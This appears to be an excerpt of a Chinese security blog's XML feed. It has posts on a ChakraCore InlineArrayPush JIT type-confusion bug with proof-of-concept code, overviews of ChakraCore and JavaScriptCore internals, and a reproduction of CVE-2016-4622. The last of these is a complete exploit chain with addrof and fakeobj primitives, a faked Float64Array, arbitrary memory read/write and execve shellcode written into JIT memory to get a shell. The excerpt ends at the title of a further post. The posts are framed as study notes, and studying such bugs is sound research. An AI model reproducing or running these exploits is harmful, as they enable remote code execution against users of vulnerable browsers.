opcod通过调用Array.prototype.push生成的.简单来说就是,假如生成这么一段代码: arr[1] = 2.2; arr.push(value); arr[1] = 3.3; 假如arr的type信息是float array,value的type信息是float,前面保存的arr type信息就不会被kill.换言之,在|arr[1] = 3.3;|中就不会生成|baitOnNotArray| IR,没有了type类型的检查代码.是的,这样就非常快了,比v8还快,但是安全吗?需要注意的是,在push里面不能触发回调,因为InlineArrayPush会生成|BailOutOnImplicitCallsPreOp|,如果触发回调是会bailout的. InlineArrayPush生成BailOutOnImplicitCallsPreOp的部分代码 它会检查数组是否为nativeArray，如果不是的话就会生成 BailOutOnImplicitCallsPreOp，否则的话生成BailOutConventionalNativeArrayAccessOnly，因此就不能传带回调的非NativeArray的对象给push。 而这就存在一种假设： 是不是不通过回调就改变不了arr对象的类型？ ###Javascript undefine undefine是JS五个基本的值类型中的一个，这个类型只有一个值，JS使用magic value(0x800000280000002)来表示。它在浮点数的表示范围里，对应的浮点数是-5.3049894784e-314，为了区分undefine和这个浮点数，Chakra在setItem中有一个特殊的处理。 JavascriptNativeFloatArray::SetItem在dValue刚好为Magic value时会进行数组类型转换，将数组类型由float array转变成var array，而push函数就是通过调用setItem函数来设置值的。 在script层调用push会调用EntryPush这个函数 所以上面的问题也就有了答案：不通过回调也能修改arr对象类型 Don’t kill my NativeArray但是经过下面的代码，在arr.push()时arr数组的type信息还是被去除了，arr[2]还是有BailOnNotArray的检查 arr[1] = 1.1; arr.push(1.123); arr[2] = 2.2; 为什么push传入一个float值但是数组的type信息还是被去除了呢？ 这涉及GlobOpt::CheckJsArrayKills对InlineArraypush opcode的操作 它会根据doArrayMissingValueCheckHoist的值来决定是否要将KillsArraysWithNoMissingValues设为true。doArrayMissingValueCheckHoist值初始为1，在前面的操作过程中可能会改变。 MissValue对应的kill操作 如果arr中type信息没有MissValue，那么经过push后，还是会删除arr的type信息。这个很好绕过，只要让valueInfo-&gt;HasNoMissingValues()返回值为false就可以了。如何让它返回值为false呢，传入一个带MissValue的arr就可以了。在经过push后，数组的类型就由float array转变成了var array。 Poc.js function jit(arr,value) { arr[0]=1.1; arr.push(value); arr[1]= 6.17651672645e-312 // 0x12345678 } let arr = [1.1,2.2,3.3]; for(let i = 0; i &lt; 20000; i++) { arr2 = [2,3,4,5,6.6,7,8,9]; delete(arr2[1]); jit(arr2,3.3); } jit(arr,-5.3049894784e-314); //0x8000000280000002 magic value print(arr[0]);//这个不回报错 print(arr[1]);//这个会报错，因为它引用了0x12345678地址处的内容当作对象，会crash 通过上面的poc可以实现fakeobj原语，但leakaddr原语实现有点巧妙。在经过push后，arr对象的类型已经修改为var array了，我们可以对它进行任何关于var array的操作。现在arr可以用于var array的赋值，并且这个赋值可以是任意的对象。 var array赋值对应的字节码为StElem_A， 查看oarr[2] = leak_obj生成的对应IR信息 这里检查了oarr的类型是否为var array, MissValue是否符合以index大小是否超出了范围。数组赋值时要注意不要触发StElem_A这个Opcode的任何bailout。通过赋值后，oarr[2]上有一个对象的地址，只有通过return oarr[2] 就可以获得这个对象的地址。要注意的是，这个return 返回的类型是float，它将对象地址以浮点数的方式返回，这是因为arr数组此时在JIT的proflie信息中还是一个double array。 Poc.js function u2d(value) { let f = new Float64Array(1); f[0] = value; let ut = new Uint32Array(f.buffer); return ut[1]*0x100000000 + ut[0]; } function jit_leak(arr,value,oarr,leak_obj) { arr[0] = 1.1; arr.push(value); oarr[2] = leak_obj; // arr is var array, bypass type check and NOT bailout return oarr[2]; } let arr = [1.1,2.2,3.3]; for(let i = 0; i &lt; 20000; i++) { arr2 = [2,3,4,5,6.6,7,8,9]; delete(arr2[1]); oarr = [1.1,2.2,3.3,{}]; jit_leak(arr2, 3.3, oarr, {}); } var hax = new Uint8Array(0x1000); let result = jit_leak(arr,-5.3049894784e-314, arr, hax/*obj to leak*/); print(u2d(result).toString(16)); 大宝对Poc的解析： 在每次JIT开始之前,都会经历一个profile阶段,用于收集对象的类型信息用于JIT时候生成相关的类型检查与访问代码.在Profile阶段,我传入了一个NoMissingValues为false的float array,所以|arr[0]|和|arr[2]|的读写都是以float形式访问,换句话说,如果arr数组中存在对象的地址则可以通过|return arr[2]|成功读取出来.但是必须在第一句|arr[0]|通过类型检查,也就是arr一开始必须为float array类型.其次,我传入了一个var array类型的数组|oarr|,所以|oarr[2] = leak_object|会把需要泄露的对象地址赋值到oarr[2]中,但是必须通过类型检查,也就是oarr在访问的时候必须为var array类型.在漏洞触发的最后一次调用中,|arr|和|oarr|其实是同一个数组,在|arr[0] = 1.1|中,此时arr是float array,通过检查,赋值成功.通过|arr.push(value)|触发漏洞,改变数组类型,变成var array类型.在第三行代码|oarr[2] = leak_object|,因为|arr|和|oarr|是同一个数组,所以oarr当前为var array类型,通过检查,赋值成功. 最后一句是最关键的代码,我们可以看到,|arr[0] = 1.1|和|return arr[2]|中有两行代码,这两行代码必须不能kill |arr|的type信息,否则就会重新类型检查,因为arr已经转变成var array类型了,如果此时有类型检查就会检查失败然后bailout.上文已经详细分析了如果arr NoMissingValues为false,|arr.push(value)|是不会kill arr的type信息的.所以现在剩下|oarr[2] = leak_object|这句,对应的opcode是StElemI_A,|CheckJsArrayKills|代码如下: 我们可以看到,并没有任何情况会kill array的type信息.所以到最后没有任何类型检查,直接以浮点数的方式访问已经变成var array类型的arr,返回刚刚赋值的对象|leak_object|,将浮点数转换为16进制,即可得到对象的地址.得到这两个原语以后,距离RCE就不远了. REFERENCE https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/]]></content>
      <categories>
        <category>JS-Engine</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>ChakraCore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ChakraCore基础知识笔记]]></title>
    <url>%2F2019%2F05%2F28%2F2019-5-28-ChakraCore%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[ChakraCore简介结构： 基本执行流程：当一个函数第一次执行时，ChakraCore 的语法解析器（parser）产生一个抽象语法树（AST）来代表这个函数的源码，随后AST 会被翻译为字节码（bytecode），这些字节码将由ChakraCore 解释器直接执行。在解释执行期间解释器会收集一些程序信息，如类型信息、调用次数，这些信息会被用来帮助JIT 编译器生成高度优化的机器码。当ChakraCore 在解释器中发现一个函数或者循环体（loop-body）被多次执行时，会将其送入后台JIT 编译队列为这个函数生成优化的代码。一旦这些优化代码准备就绪，ChakraCore 就会替换函数和循环的入口到这些新代码，之后的执行将远快于之前的解释执行。 ChakraCore 的后台JIT 编译器借助解释器生成的profile 数据来推断可能出现的模式，从而生成高度优化的本地代码。当得到JavaScript 代码的某些动态特性后，如果代码行为打破了基于profile 的预测，就会进行bailout，而bailout会放弃执行JIT代码转回使用解释器继续执行字节码，同时继续收集更多的配置文件数据。为了平衡JIT 编译时间与内存占用，ChakraCore 并不在一个函数每次释出时编译它，而是利用缓存下来的编译结果直到执行次数达到一定的门槛，之后才会迫使代码重新被JIT 编译并且抛弃旧的编译结果。 JIT编译器ChakraCore 拥有两级JIT 编译器。在同一个后台线程中，ChakraCore 有一个完全JIT 编译器（Full JIT Compiler) 用来产生高度优化的代码；还有一个简单JIT 编译器（Simple JIT Compiler），这是一个有较少优化版本的完全JIT 编译器。在执行管线中，ChakraCore 首先将解释执行的函数换入简单JIT 编译器，然后才是完全JIT 编译。在大多数情况下，简单JIT 编译耗时少于完全JIT 编译，所以相比单级JIT，这种架构有助于更快启动app 和网页。多一个Simple JIT 的另外一个优势是，当”释出“发生时，函数的执行可以更快地从解释切换到简单JIT 编译，直到完全JIT 编译的代码就绪。简单JIT 编译的代码执行管线依然继续收集profile 信息以供完全JIT 编译器使用。 无论何时，只要有潜在的未被利用的硬件资源，ChakraCore 也可为后台JIT 编译器产生多个并行线程。存在多个后台JIT 编译线程时，ChakraCore 的简单JIT 编译和完全JIT 编译的工作都会被分摊到多个编译线程上进行跨线程编译。这有助于在总体上减少JIT 编译延迟。 垃圾回收ChakraCore 拥有一个分代式标记清扫垃圾回收器，它支持并行、部分回收。当完全并行GC 被初始化，ChakraCore 的后台GC 会进行一个初始标记阶段，然后重新扫描（rescan）来找出在这个初始标记阶段被主线程修改的对象，随后再运行第二个标记阶段来标记重新扫描时被修改的对象。当第二个标记阶段扫描结束后，主线程暂停执行并启动最终的重新扫描（final rescan），之后最终的标记阶段（final marking pass）会被分解到主线程和已经在执行的GC 线程。最后清扫阶段由后台GC 线程完成，并且将无法到达的（unreachable）的对象重新加入分配池。 上面内容都来自ChakraCore的wiki文档 JIT pipeline JIT编译的主要步骤： IRBulilderPhase:根据bytecode生成IR(中间码) InlinePhase: 检查是否可以内联某些内容 FGBuildPhase: 通过IR构建控制流程图CFG GlobOptPhase: 全局优化器 SimpleJit FullJit LowererPhase: 减少IR 依赖机器的操作 RegAllocPhase FullJit: （它通过了3次CFG，一次向后，一次向前，最后是另一次向后） Backward pass 向后经过每个块。对于每个块, 向后进行指令信息搜集。为每个块收集其后续块的信息，在处理新块时合并每个后续块。可以执行一些简单的优化, 如指令重写、某些折叠优化等.. 同时搜集一些未来优化时可能用上的信息。 Forward pass 向前经过每个块，对每个块的每条指令调用不同的方法来处理(用来处理某些指令的方法，比如switch语句) 在处理新块时合并每个前任块的信息，同时这里会生成真正优化的代码。 Symbol liveness and kill mechanism 这个机制很容易出现问题，错误的一个主要来源是JIT在需要时无法杀死某些信息 Forward pass : Loops Deadstore pass REFERENCE https://msrnd-cdn-stor.azureedge.net/bluehat/bluehatil/2019/assets/doc/Attacking%20Edge%20Through%20the%20JavaScript%20Just-In-Time%20Compiler.pdf https://github.com/Microsoft/ChakraCore/wiki/Architecture-Overview]]></content>
      <categories>
        <category>JS-Engine</category>
      </categories>
      <tags>
        <tag>ChakraCore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptCore的基础知识]]></title>
    <url>%2F2019%2F05%2F13%2F2019-5-13-JavaScriptCore%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[最近在学习JSC的相关知识，这里写篇博客简单记录一下。 JavaScriptCore简介JavaScriptCore是一个JS 引擎，是专门负责处理javascript代码的虚拟机，简写为JSC，一般会附在浏览器中。 它是一个C++实现的开源项目，使用Apple提供的JavaScriptCore框架。我们可以在Objective-C或者基于C的程序中执行Javascript代码，也可以向JavaScript环境中插入一些自定义的对象。 JavaScript 引擎在解析源码后将其转换为抽象语法树（AST），基于 AST，解释器便可以开始工作并产生字节码，此时引擎正在执行 JavaScript 代码。 为了使它执行得更快，可以将字节码与分析数据（profiling data）一起发给优化编译器JIT。优化编译器根据已有的分析数据做出特定假设，然后生成高度优化的机器码。如果在某点上一个假设被证明是不正确的，那么优化编译器会去优化并回退至解释器部分 JavaScriptCore的组成JavaScriptCore主要由以下模块组成： 参考wiki JavaScriptCore Lexer 词法分析器，将脚本源码分解成一系列的Token Parser 语法分析器，处理Token并生成相应的语法树 LLInt 低级解释器，执行Parser生成的二进制代码 Baseline JIT 基线JIT（just in time 实施编译） DFG 低延迟优化的JIT FTL 高通量优化的JIT JavaScriptCore基本组件 基本组件的作用 Parser 这是所有js代码执行的入口点，它会解析源代码，并生成自定义的bytecode Interpreter 解析执行Parser生成的二进制代码 JIT Compiler (即时编译器) JSC有三种不同的优化编译器 Baseline JIT 基线JIT 接收低级解释器 LLInt解释后的代码，进行优化 DFG 低延迟优化的JIT 接收Baseline JIT 优化后的代码，进行处理 FTL 高通量优化的JIT 接收DFG 低延迟优化的JIT处理后的代码，进行最终优化 Runtime RunTime是内存空间，JS引擎利用它来管理上下文、对象和与JS函数及脚本相关的变量，提供内置函数和对象。 Garbage Collector 回收不需要的内存空间 JavaScriptCore值的表现形式JSC使用一项叫NaN-boxing的技术。NaN-boxing利用多位模式呈现，因此这些位中的其他值可以被编码。具体来说，每个IEEE 754(IEEE二进制浮点数算术标准)规定了浮点数所有指数位用不等于零的分数表示Nan-boxing。对于双精度值，这就由2 ^ 51个不同的位模式（忽略符号位并将第一个小数位设置为1，所以这也可以表示nullptr）。在64位平台上，目前只有48位用于寻址，其余32位整数和指针也就可以进行编码。 JSC具体规则实现在JSValue.h文件中实现 前十六位表示已编码的JSValue的类型，这个方案通过对数值执行64位整数加法来对双精度进行编码。在这个操作后没有编码的双精度值将以模式0x0000或0xffff开始。在执行浮点数运算前，必须通过反转该操作作为解码。标志0x0000用来表示指针或者其他标志的立即数。布尔值、空值和未定义的值由特定的、无效的指针表示。 JavaScript对象与数组JavaScript对象模型在js中，除了五种原始类型（即数字，字符串，布尔值，null，undefined）之外的都是对象。 ECMAScript 规范基本上将所有对象定义为由字符串键值映射到 property 属性的字典，可以使用点运算符（foo.bar）或通过方括号（foo[‘bar’]）来访问属性。 每个property属性的字典都有四个属性，见上图。除了[[Value]]， 还规定了以下属性 [[Writable]] 决定该属性是否可以被重新赋值； [[Enumerable]] 决定该属性是否出现在 for-in 循环中； [[Configurable]] 决定该属性是否可被删除。 javascript如何获取一个对象的属性 数组数组被定义为特殊的对象，它是具有特殊的“length”的对象，length的值总是等于最高元素的索引加一。索引被限制在0-2^32 - 2的范围间，数组最多只能有2^32-1项。 对象在内存中的存储通用的只存在一个对象时，它会使用上面所讲的对象的存储的字典数据结构。它包含用字符串表示的键值，指向各自的属性值。 而具有相同键值属性的不同对象在内存中的存储和上面所讲的不同。它多了一个叫shape的东西，shape包含了除[[Value]]外的所有属性名，并且包含了JSObject内部元素的偏移量，方便JSC去查找对象属性的值。每个具有相同键值属性的对象都会指向这个shape实例。 不同的JavaScript引擎都使用了shape做优化，但称呼不一样 学术论文称它们为 Hidden Classes（容易与 JavaScript 中的类概念混淆） V8 将它们称为 Maps（容易与 JavaScript 中的 Map 概念混淆） Chakra 将它们称为 Types（容易与 JavaScript 中的动态类型和关键字 typeof 混淆） JavaScriptCore 称它们为 Structures SpiderMonkey 称他们为 Shapes JSC的实现在JSC内部，JSC将对象的属性和对象的元素存储在同一个内存区域，并且在对象本身中存储指向该区域的指针。指针指向这个内存区域的中间，以这个指针分隔，左边是它的属性（低地址），右边是它的元素 还有一个小标题位于指向包含元素向量长度的地址之前，形如：（也称Butterfly） -------------------------------------------------------- .. | propY | propX | length | elem0 | elem1 | elem2 | .. -------------------------------------------------------- ^ | +---------------+ | +-------------+ | Some Object | +-------------+ 但是在JSC中，对象的存储不仅仅是Butterfly，还有内联存储。 JSObject的内联：（默认6个索引值） 一个小demo obj = {&#39;a&#39;: 0x1337, &#39;b&#39;: false, &#39;c&#39;: 13.37, &#39;d&#39;: [1,2,3,4]}; obj1 = {&#39;a&#39;:0x1111,&#39;b&#39;:true,&#39;c&#39;:1.123,&#39;d&#39;:[1,2],&#39;e&#39;:1,&#39;f&#39;:2,&#39;g&#39;:3}; obj2 = {&#39;a&#39;:0x1111,&#39;b&#39;:true,&#39;c&#39;:1.123,&#39;d&#39;:[1,2],&#39;e&#39;:1,&#39;f&#39;:2,&#39;g&#39;:3 , &#39;1&#39;:&#39;123&#39;}; print(describe(obj)); print(describe(obj1)); print(describe(obj2)); 输出结果： 可以发现对象的属性6个就会使用butterfly来存储多出的属性 调试，观察内存情况 obj对象的内存情况： 其中第一个4字节是JSCell；第二个是Butterfly指针，它是空的，因为所有的属性都存储在内联中。接下来是四个属性的内联JSValue槽：一个integer，false，一个double和一个JSObject指针。JSCell后四位是这个对象的StructureID 。 obj2对象的内存情况： 因为它属性多于6个，所以它分配了一个butterfly来存储多出的属性。 不同C++类构建JSC对象的关系图 JavaScript函数 arguments arguments对象是所有（非箭头）函数中都可用的局部变量。可以使用arguments对象在函数中引用函数的参数。此对象包含传递给函数的每个参数，第一个参数在索引0处。 假设一个函数传递了三个参数 arguments[0] arguments[1] arguments[2] //可以通过arguments来引用函数的参数 .call 和 .apply函数 通过给定的”this”对象和参数来调用它们 call()接收一个参数列表，apply()接收一个参数数组 后续补充 Reference http://developer.51cto.com/art/201806/576835.htm https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf https://paper.seebug.org/207/#1-javascript https://www.ibm.com/developerworks/cn/linux/shell/js/js_engine/index.html https://segmentfault.com/a/1190000011155023]]></content>
      <categories>
        <category>JS-Engine</category>
      </categories>
      <tags>
        <tag>js_exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-4622复现]]></title>
    <url>%2F2019%2F05%2F11%2F2019-5-11-CVE-2016-4622-(2016-10-27)%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[基本环境搭建编译JSC历时差不多两天的失败，网上的编译教程基本都是很久以前的，跟着他们做会报很多错，最后编译成功的jsc也运行不了，一运行就会crash….. 但是，我在github上找到了一个大佬写的教程，是可以成功的，并且他提供了编译好的 jsc以及 对应的动态链接库。 大佬github地址 环境： Ubuntu18.10 JSC编译 # sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf $ git clone git://git.webkit.org/WebKit.git &amp;&amp; cd WebKit $ Tools/gtk/install-dependencies $ Tools/Scripts/build-webkit --jsc-only --debug 编译好的jsc可执行文件会在 ~/WebKitBuild/Debug/bin中，同时jsc运行所需的动态链接库会在~/WebKitBuild/Debug/lib中，将动态链接库的所在路径添加到/etc/ld.so.conf中，然后运行 sudo ldconfig命令，就可以使用jsc了。 漏洞分析漏洞出现在ArrayPrototype.cpp文件的arrayProtoFuncSlice函数中 未修补前代码： if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) { if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } 修补后代码： bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == toLength(exec, thisObj); RETURN_IF_EXCEPTION(scope, { }); if (LIKELY(okToDoFastPath)) { if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } 可以发现它添加了thisObj长度的检查，检查它的长度是否发生了变化。可以通过回调来修改数组的长度，slice函数的执行将会继续使用之获得的长度，从而导致memcpy时越界访问。 验证POCpoc.js var a = []; for (var i = 0; i &lt; 100; i++) a.push(i + 0.123); var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }}); &gt;&gt;&gt; print(b); 0.123,1.123,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314 因为数组在切片前已经被清除，所以var b 的正确输出应该是大小为10的数组，其中被填充了”未定义的值”。但实际的输出中 会有一些奇怪的浮点值，这些是存储在数组之外的内容。 调试： 通过dir 命令，添加JSC源码路径 pwndbg&gt; dir /home/zs0zrc/webkit/Source/JavaScriptCore 在arrayProtoFuncSlice 、JSArray::setLength 、ArrayPrototype.cpp:945上 分别下断点 通过jsc运行poc.js ，它会停在arrayProtoFuncSlice函数 打印thisObj信息：（这是poc中的变量var a） pwndbg&gt; p *thisObj $1 = { &lt;JSC::JSCell&gt; = { &lt;JSC::HeapCell&gt; = {&lt;No data fields&gt;}, members of JSC::JSCell: static StructureFlags = 0, static needsDestruction = false, static TypedArrayStorageType = JSC::NotTypedArray, m_structureID = 86, m_indexingTypeAndMisc = 7 &#39;\a&#39;, m_type = JSC::ArrayType, m_flags = 8 &#39;\b&#39;, m_cellState = JSC::CellState::DefinitelyWhite }, m_butterfly = { static kind = Gigacage::JSValue, m_barrier = { m_value = { static kind = Gigacage::JSValue, m_ptr = 0x7fffaede8588 } } } pwndbg&gt; x/10gx 0x7fffaede8588 0x7fffaede8588: 0x3fbf7ced916872b0 0x3ff1f7ced916872b 0x7fffaede8598: 0x4000fbe76c8b4396 0x4008fbe76c8b4396 0x7fffaede85a8: 0x40107df3b645a1cb 0x40147df3b645a1cb 0x7fffaede85b8: 0x40187df3b645a1cb 0x401c7df3b645a1cb 0x7fffaede85c8: 0x40203ef9db22d0e5 0x40223ef9db22d0e5 其中m_ptr是数组存放元素的地址，存放着一堆浮点数 slice函数获取数组的length大小为100 JSC通过下面两条代码来获取数组的起止下标，但是在执行argumentClampedIndexFromStartOrEnd函数时会对数组a 执行 setLength函数，将数组收缩。因为valueOf回调将数组a的大小设置为0, 所以触发了数组的收缩。 unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); 函数调用链： 执行完setLength后， thisObj的m_butterfly的地址改变了 pwndbg&gt; p *thisObj $33 = { &lt;JSC::JSCell&gt; = { &lt;JSC::HeapCell&gt; = {&lt;No data fields&gt;}, members of JSC::JSCell: static StructureFlags = 0, static needsDestruction = false, static TypedArrayStorageType = JSC::NotTypedArray, m_structureID = 86, m_indexingTypeAndMisc = 7 &#39;\a&#39;, m_type = JSC::ArrayType, m_flags = 8 &#39;\b&#39;, m_cellState = JSC::CellState::DefinitelyWhite }, m_butterfly = { static kind = Gigacage::JSValue, m_barrier = { m_value = { static kind = Gigacage::JSValue, m_ptr = 0x7fffaedfe9a8 } } } pwndbg&gt; x/10gx 0x7fffaedfe9a8 0x7fffaedfe9a8: 0x3fbf7ced916872b0 0x3ff1f7ced916872b 0x7fffaedfe9b8: 0x00000000badbeef0 0x00000000badbeef0 0x7fffaedfe9c8: 0x00000000badbeef0 0x00000000badbeef0 0x7fffaedfe9d8: 0x00000000badbeef0 0x00000000badbeef0 0x7fffaedfe9e8: 0x00000000badbeef0 0x00000000badbeef0 slice函数最后返回的result pwndbg&gt; p result $41 = (JSC::JSObject *) 0x7fffaf1f8aa0 pwndbg&gt; x/10gx 0x7fffaf1f8aa0 0x7fffaf1f8aa0: 0x00007ffff6826caf 0x00000000fffffff8 0x7fffaf1f8ab0: 0x00000000fffffff8 0x0000000000000003 0x7fffaf1f8ac0: 0x0000000000000010 0x00007fffefba3630 0x7fffaf1f8ad0: 0x0000000000000000 0x00007fffefbb2fd0 0x7fffaf1f8ae0: 0x00007fffefbba5f0 0x00007ffff6824beb 漏洞利用构建exploit原语 addrof原语 用来泄露地址信息，基本步骤如下： 创建一个双精度的数组 使用自定义的valueOf函数设置对象 收缩数组 分配一个新的数组，其中包含着我们想知道地址的对象，这个数组位于复制空间，有很大的可能放在新的 butterfly后面 返回一个大于数组的值来触发漏洞 function addrof(object) { var a = []; for (var i = 0; i &lt; 100; i++) a.push(i + 0.123) var b = a.slice(0, {valueOf: function() { a.length = 0; b = [object]; return 10; }}); // Find offset 4 at runtime return Int64.fromDouble(b[4]); } slice()返回的新数组是原生的双精度数组，所以可以用来泄露任意JSValue实例。 fakeobj原语 用于将JSObject指针以双精度的形式注入到 JSValue数组中 创建一个双精度的数组 使用自定义的valueOf函数设置对象 收缩数组 分配一个新数组，其中只包含需要的对象，这个对象是我们想要知道地址的对象 返回一个大于数组大小的值来触发漏洞 function fakeobj(addr) { var a = [] for (var i = 0; i &lt; 100; i++) a.push({}) var b = a.slice(0, {valueOf: function() { a.length = 0; b = [addr.asDouble()]; return 10; }}); return b[4]; } 利用思路 信息泄漏 伪造对象(Fload64Array) 任意地址读写 读取一个function obj的地址，触发JIT生成RWX的代码 利用任意地址读写写入shellcode 执行function 具体利用 构造fake Float64Array数组 伪造Float64Array数组最重要的部分是JSCell头中的结构ID，这个id指向Float64Array在结构表中id。但是结构id只有在运行时才会被分配，同时结构id在不同的运行中不一定是静态的。因此不能知道Float64Array实例的结构id，这里通过喷射的方法，来实现FloatArray实例 原理： 通过喷射方法产生几千个结构体来表现FloatArray实例，然后选取一个高的初始id，碰撞出一个正确的id。 for (var i = 0; i &lt; 0x1000; i++) { var a = new Float64Array(1); // Add a new property to create a new Structure instance. a[randomString()] = 1337; } 伪造Float64数组 Float64数组由本地JSArrayBufferView类实现，除了包含标准的JSObject字段外，还包含指向后备存储器的指针（vector），长度（length）和模式字段（mode，32位整数）。 FloatArray对象的大致结构： 这里我们写入的JSValue要满足的条件 必须是有效的JSValue，不能为nullptr指针 不能设置有效的模式字段，要大于0x00010000 长度可以自由的控制 只能将vector指向另一个JSObject,因为这是JSValue唯一可以包含的指针 这里选择将vector指向一个Uinit8Array实例 demo: sprayFloat64ArrayStructures();//这个是喷射的函数 // 创建要使用的数组 // 读写目标内存地址 var hax = new Uint8Array(0x1000); var jsCellHeader = new Int64([ 0x0, 0x10, 0x0, 0x0, // m_structureID, current guess 0x0, // m_indexingType 0x2c, // m_type, Float64Array 0x08, // m_flags, OverridesGetOwnPropertySlot (see JSTypeInfo.h) 0x1, // m_cellState, NewWhite ]); var container = { jsCellHeader: jsCellHeader.encodeAsJSVal(), butterfly: false, // Some arbitrary value vector: hax, lengthAndFlags: (new Int64(&#39;0x0001000000000010&#39;)).asJSValue() }; // Create the fake Float64Array. var address = Add(addrof(container), 16); var fakearray = fakeobj(address); // Find the correct structure ID. while (!(fakearray instanceof Float64Array)) { jsCellHeader.assignAdd(jsCellHeader, Int64.One); container.jsCellHeader = jsCellHeader.encodeAsJSVal(); } // 完成伪造，伪造的数组现在指向hax数组 print(describe(hax)); print(describe(fakearray))； //打印对象的一些调试信息 //输出结果 //[*] hax @ 0x00007fffad95cae0 //[*] Fake Float64Array @ 0x00007fffaef99eb0 //Object: 0x7fffad95cae0 with butterfly (nil) (0x7fffaef9f2f0:[Uint8Array, {}, //NonArray, Proto:0x7fffaefc4330, Leaf]), ID: 287 //Object: 0x7fffaef99eb0 with butterfly 0x6 (0x7fffad976950:[Float64Array, //{foo3760:100}, NonArray, Proto:0x7fffaefc4340, Leaf]), ID: 4096 //[*] Float64Array structure ID found: 00001000 //伪造的数组 pwndbg&gt; x/10gx 0x7fffaef99eb0 0x7fffaef99eb0: 0x01082c0000001000 0x0000000000000006 0x7fffaef99ec0: 0x00007fffad95cae0 0x0001000000000100 0x7fffaef99ed0: 0x010a1a0000000036 0x0000000000000000 0x7fffaef99ee0: 0x00007fffaede4460 0x00007fffaefa9ea0 0x7fffaef99ef0: 0x0000000000000000 0x00000000badbeef0 //伪造的数组的vector指向了hax数组 通过修改Uint8Array的数据指针实现任意地址读写 构建任意地址读写原语 memory = { read: function(addr, length) { print(&quot;[&lt;] Reading &quot; + length + &quot; bytes from &quot; + addr); fakearray[2] = addr.asDouble(); var res = new Array(length); for (var i=0; i &lt; length; i++) res[i] = hax[i]; return res; }, read64: function(addr) { return new Int64(this.read(addr, 8)); }, write: function(addr, data) { print(&quot;[&gt;] Writing &quot; + data.length + &quot; bytes to &quot; + addr); fakearray[2] = addr.asDouble(); for (var i=0; i &lt; data.length; i++) hax[i] = data[i]; }, write64: function(value) { return this.write(addr, value.bytes()); } }; 修复容器和Float64Array实例 ， 避免在垃圾收集时崩溃 这一步的原因是因为伪造的Float64Array实例的butterfly在垃圾收集时会被被访问，但我们设置的是一个无效的指针，导致会崩溃。如果设置为nullptr,这会导致令一个崩溃。为指针值也是容器对象的属性，并且它会被当作一个JSObject指针。 具体步骤： 创建一个空对象。此对象的结构将包含具有默认数量的内联存储（6个插槽）的对象，并且全部不处于使用状态。 将JSCell头（包含结构ID）复制到容器对象。 将fake数组的“Butterfly”指针设置为nullptr指针，且使用默认的Float64Array实例来替换该对象的JSCell。 实现： var empty = {}; var header = memory.read(addrof(empty), 8); memory.write(addrof(container), header); var f64array = new Float64Array(8); header = memory.read(addrof(f64array), 16); var length = memory.read(Add(addrof(f64array), 24), 8); memory.write(addrof(fakearray), header); memory.write(Add(addrof(fakearray), 24), length); print(&quot;[+] All done!&quot;); fakearray.container = container; 写入shellcode并执行 javascript引擎使用JIT编译，需要将指令写入存储器的页面中，之后再执行它。JSC引擎会分配可读可写可执行的内存区域用于存储这些指令，所以可以泄露出函数对象的JIT编译代码的内存地址，然后往该地址写入shellcode，最后调用该函数执行shellcode. var func = makeJITCompiledFunction(); //JSFunction var funcAddr = addrof(func); print(&quot;[+] JIT compiled function @ &quot; + funcAddr); //FunctionExecutable var executableAddr = memory.read64(Add(funcAddr, 24)); print(&quot;[+] Executable instance @ &quot; + executableAddr); //JITCode // Need to leak twice (value changes) var jitCodeAddr = memory.read64(Add(executableAddr, 24)); print(&quot;[+] First try; JITCode instance @ &quot; + jitCodeAddr); // need this print (probably some gc thing) var jitCodeAddr = memory.read64(Add(executableAddr, 24)); print(&quot;[+] Second try; JITCode instance @ &quot; + jitCodeAddr); var codeAddr = memory.read64(Add(jitCodeAddr, 32)); print(&quot;[+] RWX memory @ &quot; + codeAddr.toString()); var shellcode = [0x48,0x31,0xc0,0x50,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05] print(&quot;[+] Writing shellcode...&quot;); memory.write(codeAddr, shellcode); print(&quot;[!] Jumping into shellcode...&quot;); func(); 最后成功getshell 附件 reference https://paper.seebug.org/207/#62-float64 https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622 https://o0xmuhe.github.io/2019/04/06/CVE-2016-4622-analysis/ http://www.phrack.org/papers/attacking_javascript_engines.html]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>js_exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[largebin attack]]></title>
    <url>%2F2019%2F04%2F16%2F2019-4-16-largebin-attack%2F</url>
